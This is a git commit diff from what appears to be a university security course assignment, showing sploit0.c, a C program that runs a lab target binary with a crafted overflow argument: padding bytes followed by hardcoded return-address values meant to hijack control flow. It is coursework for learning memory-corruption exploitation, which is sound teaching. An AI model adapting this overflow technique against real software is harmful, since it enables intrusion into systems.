63d06ac03b88e62618ad7f4b3e5c155a94921a59
Chang-Yen Tseng <tsengcy@cs.wisc.edu>
2021-11-14 17:40:24 -0600

    sploit 0,2,4

--- HW4/sploits/sploit0.c
+++ HW4/sploits/sploit0.c
@@ -5,16 +5,19 @@
 
 #define TARGET "/tmp/target0"
 
-int main(void)
-{
-  char *args[3];
-  char *env[1];
+int main(void) {
+    char *args[3];
+    char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
-  env[0] = NULL;
+    args[0] = TARGET;
+    args[1] =
+        "00000000000000000000000000000000"
+        "\x88\xf8\xff\xbf"
+        "\x1d\x85\x04\x08";
+    args[2] = NULL;
+    env[0] = NULL;
 
-  if (0 > execve(TARGET, args, env))
-    fprintf(stderr, "execve failed.\n");
+    if (0 > execve(TARGET, args, env)) fprintf(stderr, "execve failed.\n");
 
-  return 0;
+    return 0;
 }
